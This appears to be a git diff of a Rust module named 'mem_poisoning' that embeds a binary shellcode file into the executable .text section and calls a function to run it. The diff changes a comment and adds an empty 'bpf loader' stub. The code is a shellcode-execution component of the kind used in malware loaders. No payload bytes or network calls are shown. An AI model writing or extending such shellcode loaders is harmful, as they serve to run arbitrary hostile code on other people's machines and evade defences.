@@ -80,7 +80,7 @@ pub mod mem_poisoning{
     //// we must dereference the &[u8] shellcode to inject the buffer itself otherwise the reference of the buffer will be injected  
     #[no_mangle]
     #[link_section=".text"] //// means we're executing the shellcode inside the .text section of the memory
-    pub static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("shellcode.bin"); //// includes a file as a reference to a byte array of a binary file thus we must dereference it in order to coerce it into [u8]
+    pub static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("shellcode.bin"); //// includes a file as a reference to a byte array of a binary file thus we must dereference it in order to coerce it into [u8] since it returns &[u8]
 
 
 
@@ -93,5 +93,15 @@ pub mod mem_poisoning{
         exec_shellcode();
 
     }
+
+}
+
+
+
+
+pub async fn loader(){
+
+    // bpf loader
+    // ... 
 
 }
